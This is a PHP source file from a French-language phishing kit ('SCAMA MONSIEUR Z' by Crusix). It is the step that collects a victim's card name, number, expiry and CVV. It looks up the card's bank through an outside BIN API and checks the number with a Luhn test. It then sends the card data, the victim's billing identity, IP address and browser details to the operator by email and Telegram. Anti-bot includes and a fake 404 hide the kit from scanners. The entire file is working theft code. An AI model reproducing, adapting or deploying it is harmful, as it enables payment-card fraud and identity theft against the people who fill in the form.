<?php

error_reporting(0);
ob_start();
session_start();
include('../ANTIBOTS/antibots.php');
include('../mail.php');
include '../telegram.php';
include('../featuresenabler.php');
/*
SCAMA MONSIEUR Z
BY CRUSIX
GET_CARD.PHP
*/

if(isset($_POST['cardname'])){
$_SESSION['cardname'] = $_POST['cardname'];
$_SESSION['cardnum'] = $_POST['cardnum'];
$_SESSION['cardexp'] = $_POST['cardexp'];
$_SESSION['cardcvv'] = $_POST['cardcvv'];

$_SESSION['ip'] = $_SERVER['REMOTE_ADDR']; 
$_SESSION['browserinfo'] = $_SERVER['HTTP_USER_AGENT'];

if(empty($_SESSION['cardname']) || empty($_SESSION['cardnum']) || empty($_SESSION['cardexp']) || empty($_SESSION['cardcvv']))
{
    header('Location: card.php?blank=true');
}

else{
$cc = $_SESSION['cardnum'];
$bin = substr($cc, 0, 6);
$bins = str_replace(' ','',$bin);
$ch = curl_init();
$url = "https://bins-su-api.now.sh/api/$cc";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Accept-Version: 3';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$_SESSION['bank'] = '';
$_SESSION['type'] = '';
$_SESSION['level']  = '';
$_SESSION['country']  = '';
$someArray = json_decode($result, true);
$_SESSION['bank'] = $someArray['data']['bank'];
$_SESSION['type'] = $someArray['data']['type'];
$_SESSION['level'] = $someArray['data']['level'];
$_SESSION['country'] = $someArray['data']['country'];
$msg = "


  💳[Informations Bancaires]💳
  🍒 Nom sur la carte : ".$_SESSION['cardname']."
  🍒 Numéro de carte : ".$_SESSION['cardnum']."
  🍒 Date d'expiration : ".$_SESSION['cardexp']."
  🍒 CVV (Code de sécurité) : ".$_SESSION['cardcvv']."

  🏛️ Banque : ".$_SESSION['bank']."
  🏛️ Niveau : ".$_SESSION['level']."
  🏛️ Type : ".$_SESSION['type']."
  🏛️ Pays : ".$_SESSION['country']."

  🏛[Informations de Facturation]🏛
  💣 Nom : ".$_SESSION['last_name']."
  💣 Prénom : ".$_SESSION['first_name']."
  💣 Date de naissance : ".$_SESSION['dob']."
  💣 Adresse : ".$_SESSION['adresse']."
  💣 Ville : ".$_SESSION['ville']."
  💣 Code postale : ".$_SESSION['codepostale']."
  💣 Numéro de téléphone : ".$_SESSION['phone']."

  ⌛️[Informations Tierces]⌛️
  🎪 IP Adress : ".$_SESSION['ip']."
  🌐 User Agent : ".$_SESSION['browserinfo']."
";
$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=92=B3=E3=80=8D_=2B1_CC_-_?=".$_SESSION['ip']." - ".$_SESSION['bank']." - ".$_SESSION['level'];
$fromsender = "From: =?utf-8?Q?=F0=9F=94=B4MONSIEUR_Z=F0=9F=94=B4?= <log@crusxlebg.com>";
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}
if(is_valid_luhn($_SESSION['cardnum']) && is_numeric($_SESSION['cardnum'])){
mail($rezmail,$subject,$msg,$fromsender);
	telegram($msg);
$_SESSION['card'] = true;
$_SESSION['vbv'] = true;

if($vbv_applepay == "off")
{
  header('Location: loading.php?'.uniqid());

}
else{
header('Location: finished.php?'.uniqid());
}


}
else{

	header('Location: card.php?refused=true');
}

}
}
else{
	die('HTTP/1.0 404 Not Found');
}
?>